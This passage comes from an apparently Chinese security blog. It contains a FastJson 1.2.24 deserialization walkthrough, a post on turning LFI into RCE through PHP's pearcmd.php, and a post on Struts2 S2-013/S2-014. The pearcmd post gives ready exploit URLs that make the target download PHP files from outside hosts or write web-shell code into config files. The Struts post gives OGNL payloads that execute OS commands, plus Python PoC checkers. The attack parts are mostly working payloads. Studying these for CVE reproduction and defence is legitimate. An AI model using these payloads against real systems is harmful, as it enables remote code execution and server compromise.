continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field = TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">        if (field == null &amp;&amp; types[0] == boolean.class) &#123;//字段不存在或是bool型</span><br><span class="line">            String isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);</span><br><span class="line">            field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                     annotation, fieldAnnotation, null));//添加到fieldList</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Field field : clazz.getFields()) &#123; // 添加非静态字段</span><br><span class="line">        int modifiers = field.getModifiers();</span><br><span class="line">        if ((modifiers &amp; Modifier.STATIC) != 0) &#123;//不允许STATIC</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if((modifiers &amp; Modifier.FINAL) != 0) &#123;</span><br><span class="line">            Class&lt;?&gt; fieldType = field.getType();</span><br><span class="line">            boolean supportReadOnly = Map.class.isAssignableFrom(fieldType) </span><br><span class="line">                    || Collection.class.isAssignableFrom(fieldType)</span><br><span class="line">                    || AtomicLong.class.equals(fieldType) //</span><br><span class="line">                    || AtomicInteger.class.equals(fieldType) //</span><br><span class="line">                    || AtomicBoolean.class.equals(fieldType);</span><br><span class="line">            if (!supportReadOnly) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        boolean contains = false;</span><br><span class="line">        for (FieldInfo item : fieldList) &#123;</span><br><span class="line">            if (item.name.equals(field.getName())) &#123;</span><br><span class="line">                contains = true;</span><br><span class="line">                break; // 已经是 contains = true，无需继续遍历</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (contains) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;</span><br><span class="line">        String propertyName = field.getName();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,</span><br><span class="line">                                     fieldAnnotation, null));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Method method : clazz.getMethods()) &#123; // getter methods</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        if (methodName.length() &lt; 4) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) &#123;</span><br><span class="line">            if (method.getParameterTypes().length != 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (Collection.class.isAssignableFrom(method.getReturnType()) //</span><br><span class="line">                || Map.class.isAssignableFrom(method.getReturnType()) //</span><br><span class="line">                || AtomicBoolean.class == method.getReturnType() //</span><br><span class="line">                || AtomicInteger.class == method.getReturnType() //</span><br><span class="line">                || AtomicLong.class == method.getReturnType() //</span><br><span class="line">            ) &#123;</span><br><span class="line">                String propertyName;</span><br><span class="line"></span><br><span class="line">                ...</span><br><span class="line">                </span><br><span class="line">                FieldInfo fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">                if (fieldInfo != null) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (propertyNamingStrategy != null) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>大致总结一下会将哪些字段添加到FieldList中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）</span><br><span class="line">2. 非Static和Final的字段（是的话要满足某些条件）</span><br><span class="line">3. 返回值是满足某些条件的非静态get方法对应的字段</span><br></pre></td></tr></table></figure>
<p>最后返回排序后的FieldList,生成deserializer<br>接着调用了<code>return deserializer.deserialze(this, clazz, fieldName);</code><br>在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入<code>parseField</code><br><code>@type</code>字典下的其他字段,会进入<br><code>boolean match = parseField(parser, key, object, type, fieldValues);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,</span><br><span class="line">                          Map&lt;String, Object&gt; fieldValues) &#123;</span><br><span class="line">    JSONLexer lexer = parser.lexer; // xxx</span><br><span class="line"></span><br><span class="line">    FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null</span><br><span class="line"></span><br><span class="line">    final int mask = Feature.SupportNonPublicField.mask;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());</span><br><span class="line"></span><br><span class="line">    fieldDeserializer.parseField(parser, object, objectType, fieldValues);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在fieldList字段查找存在后进入<code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    Object value;</span><br><span class="line">    if (fieldValueDeserilizer instanceof JavaBeanDeserializer) &#123;</span><br><span class="line">        JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;</span><br><span class="line">        value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (object == null) &#123;</span><br><span class="line">            fieldValues.put(fieldInfo.name, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setValue(object, value);//进入这里</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后进入setValue</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ublic void setValue(Object object, Object value) &#123;</span><br><span class="line">        if (value == null //</span><br><span class="line">            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Method method = fieldInfo.method;</span><br><span class="line">            if (method != null) &#123;</span><br><span class="line">                if (fieldInfo.getOnly) &#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    method.invoke(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">                return;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new JSONException(&quot;set property error, &quot; + fieldInfo.name, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>进入对应字段的set或者get方法</p>
<p>至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了<br>因为以下payload能成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>且符合</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li><input checked="" disabled="" type="checkbox"> 非静态方法</li>
<li><input checked="" disabled="" type="checkbox"> 返回类型为void或当前类</li>
<li><input checked="" disabled="" type="checkbox"> 参数个数为1个<br>这些条件<br>RCE达成</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="cku8j3fgf001pdan7czypgvzb" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$argv</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .</span><br><span class="line">         <span class="string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = Console_Getopt::readPHPArgv();</span><br><span class="line">...</span><br><span class="line">array_shift(<span class="variable">$argv</span>);<span class="comment">//这里删除了第一个argv，通常argv[0]是程序名</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p><code>Getopt.php:readPHPArgv</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_array(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@is_array(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p>
<p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p>
<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:60080/?1+2+3+4+%20+%EF%BF%BD">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/index.php:4:</span><br><span class="line">array (size=6)</span><br><span class="line">  0 =&gt; string &#x27;1&#x27; (length=1)</span><br><span class="line">  1 =&gt; string &#x27;2&#x27; (length=1)</span><br><span class="line">  2 =&gt; string &#x27;3&#x27; (length=1)</span><br><span class="line">  3 =&gt; string &#x27;4&#x27; (length=1)</span><br><span class="line">  4 =&gt; string &#x27;%20&#x27; (length=3)</span><br><span class="line">  5 =&gt; string &#x27;%dd&#x27; (length=3)</span><br></pre></td></tr></table></figure>

<p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p>
<p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p>
<p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p>
<p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p>
<ol>
<li>register_argc_argv=On（默认是开的）</li>
<li>包含pearcmd.php或者peclcmd.php</li>
</ol>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p>
<p>exp1:</p>
<p>需要出网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面</span><br><span class="line">http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</span><br></pre></td></tr></table></figure>



<p>exp2:</p>
<p>需要出网</p>
<p>会下载到当前文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面</span><br><span class="line">http://192.168.43.230:60080/?f=fuckyou.php</span><br></pre></td></tr></table></figure>



<p>exp3:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.43.230:60080/?+config-create+/<span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span>/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符</span></span><br><span class="line">http:<span class="comment">//192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</span></span><br></pre></td></tr></table></figure>



<p>exp4:</p>
<p><strong>最好用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面</span><br><span class="line">http://192.168.43.230:60080/config2.php</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" data-id="cku8j3fgh001udan75igval8a" data-title="LFI利用php自带的pearcmd.php直接RCE" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-S2-013_S2-014远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">S2-013_S2-014远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">link.action?xxx=$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">link.action?xxx=$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>



<p>s2-014</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/S2-013/link.action?xxxx=$&#123;(#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false)(#_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))&#125;</span><br></pre></td></tr></table></figure>



<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    url+=<span class="string">&#x27;&#x27;&#x27;/link.action&#x27;&#x27;&#x27;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;xxx&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;echo structs2_s2-013_vuln_checkflag&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        res=requests.get(url,params=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;structs2_s2-013_vuln_checkflag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>S2-014</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    url+=<span class="string">&#x27;&#x27;&#x27;/link.action&#x27;&#x27;&#x27;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;xxx&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;$&#123;(#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false)(#_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        res=requests.get(url,params=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;structs2_s2-014_vuln_checkflag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p>

      
    </div>
    <footer class="article-footer">
